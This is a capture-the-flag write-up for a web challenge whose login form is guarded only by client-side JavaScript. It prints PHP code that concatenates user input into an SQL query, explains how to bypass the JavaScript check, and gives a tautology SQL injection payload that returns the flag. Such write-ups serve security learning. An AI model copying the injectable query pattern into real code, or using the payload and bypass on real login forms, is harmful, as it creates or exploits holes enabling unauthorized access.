###Solved by bitvijays

Client Side

Kyle didn't think his login form was secure enough, so he added Javascript! Smart Right? http://web.lasactf.com:63017

Going to the website provided us with the

```
Log In

Username: 

Password:

Login
Error, invalid characters detected
login.php source
```

As login.php source is provided it is quite clear that the sql injection exists
```
<?php
  include "config.php";
  $con = new SQLite3($database_file);

  $username = $_POST["username"];
  $password = $_POST["password"];
  $query = "SELECT * FROM users WHERE name='$username' AND password='$password'";
  $result = $con->query($query);
  $row = $result->fetchArray();

  if ($row) {
    echo "<h1>Logged in!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  } else {
    echo "<h1>Login failed.</h1>";
  }
?>
```

But we enter ' , the client side javascript says "Invalid characters detected"

This can be taken care by using NoScript in Iceweasel or disabling javascript or by intercepting in burp suite.

On entering ' or '1'='1' --# in the login after disabling javascript.

It provides the flag

```
Logged in!

Your flag is: lasactf{cl1ent_sid3_b3st_s1de}
```

The flag is **lasactf{cl1ent_sid3_b3st_s1de}**
